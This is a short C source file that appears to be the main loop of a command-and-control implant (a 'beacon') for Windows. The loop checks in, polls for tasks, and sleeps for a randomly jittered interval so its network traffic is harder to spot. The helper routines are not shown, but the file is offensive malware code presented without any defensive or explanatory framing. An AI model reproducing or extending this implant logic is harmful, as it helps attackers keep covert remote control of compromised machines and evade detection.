#include <beacon.h>
#include <bcrypt.h>

DWORD WINAPI beacon_loop(LPVOID lpParam) {
    (void)lpParam;

    BEACON_CTX ctx = {0};
    beacon_ctx_init(&ctx);

    while (1) {
        beacon_checkin(&ctx);
        beacon_poll_tasks(&ctx);

        DWORD jitter_ms = ctx.sleep_ms * ctx.jitter_pct / 100;
        DWORD sleep_ms  = ctx.sleep_ms;
        if (jitter_ms > 0) {
            DWORD rand_val = 0;
            BCryptGenRandom(NULL, (PUCHAR)&rand_val, sizeof(rand_val),
                            BCRYPT_USE_SYSTEM_PREFERRED_RNG);
            ULONGLONG range = (ULONGLONG)jitter_ms * 2 + 1;
            LONG delta  = (LONG)(rand_val % range) - (LONG)jitter_ms;
            LONG result = (LONG)ctx.sleep_ms + delta;
            sleep_ms    = result > 0 ? (DWORD)result : 0;
        }
        Sleep(sleep_ms);
    }

    return 0;
}